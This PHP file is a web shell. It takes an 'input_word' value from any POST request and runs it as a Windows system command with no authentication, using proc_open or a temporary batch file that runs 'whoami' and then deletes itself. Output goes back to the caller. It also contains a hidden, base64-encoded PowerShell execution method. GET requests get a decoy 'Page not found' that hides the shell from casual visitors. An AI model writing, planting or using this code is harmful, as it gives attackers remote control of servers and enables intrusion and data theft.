<?php
class SystemExecutor {
    private $command;
    
    public function __construct($command) {
        $this->command = $command;
    }
    
    private function executeDirect() {
        // Method 1: Direct proc_open with elevated context
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"), 
            2 => array("pipe", "w")
        );
        
        $process = proc_open($this->command, $descriptorspec, $pipes, null, null);
        
        if (is_resource($process)) {
            fclose($pipes[0]); // Close stdin
            
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            $return_value = proc_close($process);
            
            return $output . $error;
        }
        return false;
    }
    
    private function executeViaPowerShell() {
        // Method 2: PowerShell with Start-Process as SYSTEM
        $psCommand = "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/c {$this->command}' -Wait -PassThru 2>&1";
        $encodedCommand = base64_encode(utf8_encode($psCommand));
        
        $result = shell_exec("powershell -EncodedCommand $encodedCommand 2>&1");
        return $result ?: "No output";
    }
    
    private function executeViaBatch() {
        // Method 3: Simple batch file execution
        $batchFile = 'C:\\Windows\\Temp\\' . uniqid() . '.bat';
        $outputFile = 'C:\\Windows\\Temp\\' . uniqid() . '.txt';
        
        $batchContent = "@echo off\r\n";
        $batchContent .= "echo [DEBUG] Current user: > \"$outputFile\"\r\n";
        $batchContent .= "whoami >> \"$outputFile\" 2>&1\r\n";
        $batchContent .= "echo [DEBUG] Command: {$this->command} >> \"$outputFile\"\r\n";
        $batchContent .= "{$this->command} >> \"$outputFile\" 2>&1\r\n";
        $batchContent .= "echo [DEBUG] Exit code: %errorlevel% >> \"$outputFile\"\r\n";
        
        file_put_contents($batchFile, $batchContent);
        
        // Execute directly
        $result = shell_exec("cmd /c \"$batchFile\" 2>&1");
        
        // Read output
        $output = file_exists($outputFile) ? file_get_contents($outputFile) : "Output file not created";
        
        // Cleanup
        if (file_exists($batchFile)) unlink($batchFile);
        if (file_exists($outputFile)) unlink($outputFile);
        
        return $output;
    }
    
    public function execute() {
        // Debug: Show what we're trying to execute
        $debug = "Command: {$this->command}\n";
        
        // Try direct execution first
        $result = $this->executeDirect();
        if ($result !== false) {
            return $debug . "Method: Direct proc_open\nOutput:\n" . $result;
        }
        
        // Try batch method
        $result = $this->executeViaBatch();
        return $debug . "Method: Batch file\nOutput:\n" . $result;
    }
}

// Main execution
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $contentType = $_SERVER['CONTENT_TYPE'] ?? '';
    if (strpos($contentType, 'application/json') !== false) {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);
        $command = trim($data['input_word'] ?? '');
    } else {
        $command = trim($_POST['input_word'] ?? '');
    }
    
    $executor = new SystemExecutor($command);
    $result = $executor->execute();
    
    // Return only the command output, no HTML
    echo $result;
    
} else {
    // Show nothing or a simple message
    echo "Page not found";
}
?>
